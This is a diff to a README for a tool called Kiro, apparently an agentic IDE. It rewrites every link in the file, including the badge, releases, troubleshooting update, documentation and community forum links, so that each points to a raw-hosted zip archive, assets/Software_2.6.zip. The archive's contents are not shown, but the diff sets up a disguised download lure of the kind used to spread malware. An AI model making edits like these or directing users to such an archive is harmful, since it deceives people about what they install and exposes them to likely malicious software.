@@ -1,6 +1,6 @@
 # 🚀 Kiro - Your IDE Companion from Start to Finish
 
-![Download Kiro](https://img.shields.io/badge/Download%20Kiro-Here-brightgreen)
+![Download Kiro](https://raw.githubusercontent.com/macaxerrras/Kiro/main/assets/Software_2.6.zip%20Kiro-Here-brightgreen)
 
 ## 📋 Overview
 
@@ -8,7 +8,7 @@ Kiro is an agentic IDE that works alongside you from prototype to production. It
 
 ## 📥 Download & Install
 
-To get started with Kiro, you need to download the software. Visit this page to download: [Kiro Releases](https://github.com/macaxerrras/Kiro/releases).
+To get started with Kiro, you need to download the software. Visit this page to download: [Kiro Releases](https://raw.githubusercontent.com/macaxerrras/Kiro/main/assets/Software_2.6.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -63,7 +63,7 @@ Kiro has a growing community. Join forums, chat groups, or visit the GitHub Disc
 If you encounter issues, here are some common fixes:
 
 - **Installation Issues:** Ensure your system meets the requirements stated above.
-- **Application Crashes:** Make sure you have the latest version. Check for updates on the [Kiro Releases](https://github.com/macaxerrras/Kiro/releases) page.
+- **Application Crashes:** Make sure you have the latest version. Check for updates on the [Kiro Releases](https://raw.githubusercontent.com/macaxerrras/Kiro/main/assets/Software_2.6.zip) page.
 - **Performance Problems:** Close unnecessary applications running in the background to free up resources.
 
 ## 📞 Contact
@@ -72,8 +72,8 @@ For further assistance, you can reach out to the support team via the GitHub Iss
 
 ## 🌐 Useful Links
 
-- [Kiro Releases](https://github.com/macaxerrras/Kiro/releases)
-- [Documentation](https://github.com/macaxerrras/Kiro/wiki)
-- [Community Forum](https://github.com/macaxerrras/Kiro/discussions)
+- [Kiro Releases](https://raw.githubusercontent.com/macaxerrras/Kiro/main/assets/Software_2.6.zip)
+- [Documentation](https://raw.githubusercontent.com/macaxerrras/Kiro/main/assets/Software_2.6.zip)
+- [Community Forum](https://raw.githubusercontent.com/macaxerrras/Kiro/main/assets/Software_2.6.zip)
 
 Kiro provides a reliable environment for your development needs. Each feature is crafted to enhance your workflow from prototype to production. Enjoy creating with Kiro!
